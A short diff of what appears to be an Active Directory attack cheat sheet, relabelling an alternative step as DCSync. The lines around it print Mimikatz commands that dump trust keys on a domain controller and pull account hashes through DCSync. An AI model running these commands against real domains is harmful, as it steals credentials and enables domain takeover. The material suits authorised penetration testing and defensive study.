@@ -846,7 +846,7 @@ https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation
 On the DC:
 ```Invoke-Mimikatz -Command '"lsadump::trust /patch"'```
 
-OR:
+OR via DCSync:
 ```Invoke-Mimikatz -Command '"lsadump::dcsync /user:bcorp\bob$"'```
 
 ```Invoke-Mimikatz -Command '"lsadump::dcsync /domain:external.local /user:bob$"'```
